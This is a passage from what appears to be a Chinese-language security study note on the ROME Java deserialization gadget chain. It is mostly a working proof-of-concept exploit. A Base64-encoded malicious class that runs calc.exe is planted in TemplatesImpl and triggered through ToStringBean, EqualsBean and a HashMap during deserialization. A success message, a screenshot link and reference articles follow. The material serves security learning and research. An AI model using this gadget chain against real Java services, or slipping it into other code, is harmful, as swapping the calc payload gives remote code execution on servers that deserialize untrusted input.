        TemplatesImpl templates = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT");
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

//        templates.getOutputProperties();

        ToStringBean toStringBean = new ToStringBean(Templates.class,new TemplatesImpl());
//        toStringBean.toString();

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
//        equalsBean.beanHashCode();

        HashMap<Object, Object> map = new HashMap<>();
        map.put(equalsBean, "Gadget");

        setValue(toStringBean, "_obj", templates);

        //序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(map);
        oos.close();

        //反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

    }
}
```

成功弹出

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%2015.png)

参考文章：

[Java安全学习——ROME反序列化](https://goodapple.top/archives/1145)

[ROME 反序列化分析](https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html#rome-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90)

[ROME反序列化|ysoserial学习(一)](https://h0cksr.xyz/archives/721#header-id-3)

[Rome链分析](https://blog.csdn.net/RABCDXB/article/details/125567452)

[『Java安全』反序列化-Rome 1.0反序列化POP链分析_ysoserial Rome payload分析](https://blog.csdn.net/Xxy605/article/details/123330443)

感谢师傅们的文章 😜